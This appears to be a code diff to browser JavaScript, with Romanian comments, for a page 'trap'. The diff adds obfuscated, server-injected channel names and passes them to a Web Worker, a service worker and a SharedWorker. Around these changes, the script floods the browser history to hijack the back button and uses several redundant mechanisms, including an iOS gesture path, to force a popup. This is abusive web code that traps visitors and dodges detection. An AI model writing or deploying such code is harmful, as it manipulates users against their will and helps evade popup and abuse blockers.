@@ -12,6 +12,12 @@
   var AUTO_BACK=cfg.AUTO_BACK_MS||1000;
   var delay=window.__ab?window.__ab.delay:(cfg.POPUP_DELAY_MS||20000);
 
+  // Channel names dinamice — citite din __CONFIG injectat de middleware
+  // Dacă lipsesc (dev local), fallback la valori statice
+  var CH_MAIN=cfg.BROADCAST_CHANNEL||'trap_ch';
+  var CH_HB=cfg.HB_CHANNEL||'trap_sw_hb';
+  var DB_NAME=cfg.DB_NAME||'trap_db';
+
   // --- HISTORY FLOOD + AUTO-BACK ---
   for(var i=0;i<FLOOD;i++)history.pushState({t:i},'','#s'+i);
   setTimeout(function(){history.go(-(FLOOD+1))},AUTO_BACK);
@@ -25,6 +31,8 @@
     var blobUrl=URL.createObjectURL(blob);
     var w=new Worker(blobUrl);
     w.onmessage=function(e){if(e.data==='fire'&&window.__showPopup)window.__showPopup()};
+    // trimitem config la worker: delay + channel name obfuscat
+    w.postMessage({type:'init', delay:delay, chHb:CH_HB});
     setTimeout(function(){URL.revokeObjectURL(blobUrl)},delay+5000);
   }catch(e){
     // fallback: setTimeout direct
@@ -61,7 +69,7 @@
 
   // --- MECHANIC: BroadcastChannel (semnal de la SW/SharedWorker) ---
   try{
-    var ch=new BroadcastChannel(cfg.BROADCAST_CHANNEL||'trap_ch');
+    var ch=new BroadcastChannel(CH_MAIN);
     ch.onmessage=function(e){if(e.data==='fire'&&window.__showPopup)window.__showPopup()};
   }catch(e){}
 
@@ -70,8 +78,26 @@
     navigator.serviceWorker.addEventListener('message',function(e){
       if(e.data==='fire'&&window.__showPopup)window.__showPopup();
     });
-    navigator.serviceWorker.register('/sw.js',{scope:'/'}).catch(function(){});
+    navigator.serviceWorker.register('/sw.js',{scope:'/'}).then(function(){
+      // trimitem channel names la SW — timer_start cu chMain + chHb
+      navigator.serviceWorker.ready.then(function(reg){
+        if(reg.active) reg.active.postMessage({
+          type:'timer_start', delay:delay,
+          chMain:CH_MAIN, chHb:CH_HB
+        });
+      });
+    }).catch(function(){});
   }
+
+  // --- MECHANIC: SharedWorker init cu channel names dinamice ---
+  try{
+    if(typeof SharedWorker!=='undefined'){
+      var sw2=new SharedWorker('/workers/shared-worker.js');
+      sw2.port.onmessage=function(e){if(e.data==='fire'&&window.__showPopup)window.__showPopup()};
+      sw2.port.postMessage({type:'init', delay:delay, chMain:CH_MAIN, dbName:DB_NAME});
+      sw2.port.start();
+    }
+  }catch(e){}
 
   // --- MECHANIC: iOS gesture layer (blank-first window.open via ios-popup.js) ---
   // ios-popup.js expune window.__iosPopup
